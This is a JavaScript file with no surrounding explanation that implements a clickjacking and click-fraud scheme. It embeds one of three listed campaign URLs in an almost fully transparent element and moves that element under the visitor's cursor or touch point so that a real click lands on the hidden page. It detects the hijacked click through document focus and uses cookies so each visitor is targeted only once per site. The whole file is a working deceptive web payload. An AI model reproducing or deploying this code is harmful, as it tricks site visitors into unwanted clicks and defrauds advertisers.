let sitesRand = [
    {link: 'https://www.saudefeminina.top/?utm=facebook&campanha=28d645a624b3f09820e4938912a1ed3c', cookie: '_gcli_3'},
    {link: 'https://turismobr.online/?utm=facebook&campanha=a4114a43bea2ffd5c3f836b819a45c92', cookie: '_gcli_2'},
    {link: 'https://trox.online/?utm=facebook&campanha=c24b7fe7c641ae9a1d93a1f0158f9cbf', cookie: '_gcli_1'},
];
let siteSelected = [{link: null, cookie: null}];
let monitorTracker = null;
let canTrack = 0;
let htmlCode = '<div id="_gcli_div"><object id="_gcli_obj" type="text/html" style="position:absolute;width:100%;height:100%;overflow:hidden"></object></div>';
let cssCode = '<style>#_gcli_div{position:fixed;z-index:-999999;bottom:0;left:0;height:100%;width:100%;opacity:0.001;overflow:hidden;}</style>';
let pointerTracker = function(e){
    let out = {x:0, y:0};
    if(e.type == 'touchstart' || e.type == 'touchmove' || e.type == 'touchend' || e.type == 'touchcancel' || e.type == 'touchforcechange'){
        let touch = e.originalEvent.touches[0] || e.originalEvent.changedTouches[0];
        out.x = touch.pageX;
        out.y = touch.pageY;
    } else if (e.type == 'mousedown' || e.type == 'mouseup' || e.type == 'mousemove' || e.type == 'mouseover'|| e.type=='mouseout' || e.type=='mouseenter' || e.type=='mouseleave') {
        out.x = e.pageX;
        out.y = e.pageY;
    }
    return out;
};

function randomizeArray(a) {
    let j, x, i;
    for (i = a.length - 1; i > 0; i--) {
        j = Math.floor(Math.random() * (i + 1));
        x = a[i];
        a[i] = a[j];
        a[j] = x;
    }
    return a;
}
function setCookie(strCookie, strValor, lngHoras) {
    let dtmData = new Date();
    let strExpires = null;
    if (lngHoras) {
        dtmData.setTime(dtmData.getTime() + (lngHoras * 60 * 1000 * 60));
        strExpires = "; expires=" + dtmData.toGMTString();
    } else {
        strExpires = "";
    }
    document.cookie = strCookie + "=" + strValor + strExpires + "; path=/";
}
function getCookie(strCookie) {
    let strNomeIgual = strCookie + "=";
    let arrCookies = document.cookie.split(';');
    for (let i = 0; i < arrCookies.length; i++) {
        let strValorCookie = arrCookies[i];
        while (strValorCookie.charAt(0) == ' ') {
            strValorCookie = strValorCookie.substring(1, strValorCookie.length);
        }
        if (strValorCookie.indexOf(strNomeIgual) == 0) {
            return strValorCookie.substring(strNomeIgual.length, strValorCookie.length);
        }
    }
    return null;
}
function minimizeDiv() {
    canTrack = 0;
    $("#_gcli_div").css("width", "100%").css("height", "100%").css("top", "0").css("left", "0").css("z-index", "-999999").css("position", "fixed");
    $("#_gcli_obj").css("top", "").css("left", "").css("pointer-events", "none");
}
function insertCode(){
    $("body").append(cssCode + htmlCode).css("overflow-x", "hidden").css("width", "100%");
    $(document).on('mousemove touchstart', function(e){
        let tracker = pointerTracker(e);
        if (canTrack == 1) {
            $('#_gcli_div').css({
                left:  tracker.x - Math.floor(Math.random()*(324-284+1)+284),
                top:   tracker.y - Math.floor(Math.random()*(40-20+1)+20)
            });
        }
    });

    minimizeDiv();
    setUrlObj();
}
function setUrlObj() {
    document.getElementById('_gcli_obj').data = siteSelected.link;
    showOrMinimize();
}
function showDiv() {
    canTrack = 1;
    startTracker();

    $("#_gcli_obj").css("top", "-110px").css("left", "-70px").css("pointer-events", "");
    $("#_gcli_div").css("width", "780px").css("height", "200px").css("z-index", "999999").css("position", "absolute");
}
function showOrMinimize() {
    document.getElementById('_gcli_obj').onload=function(){
        if(getCookie(siteSelected.cookie) || getCookie("_gcli_delay_time")){
            setTimeout(minimizeDiv,1000);
        } else {
            setTimeout(showDiv,5000);
        }
    }
}
function setClick(){
    setCookie(siteSelected.cookie, '1', 24 * 10);
    setCookie("_gcli_delay_time", '1', 1);
    document.activeElement.blur();
}
function startTracker() {
    monitorTracker = setInterval(function(){
        let elem = document.activeElement;
        if(elem && elem.tagName == 'OBJECT'){
            setTimeout(setClick,200);
            setTimeout(minimizeDiv,1000);
            clearInterval(monitorTracker);
        }
    }, 500);
}
$(document).ready(function () {
    let i = 0;
    let alreadyClicked = true;
    randomizeArray(sitesRand);

    while (i < sitesRand.length) {
        if(getCookie(sitesRand[i].cookie) == null){
            siteSelected = sitesRand[i];
            alreadyClicked = false;
            break;
        }
        siteSelected = sitesRand[i];
        i++;
    }
    insertCode();
});
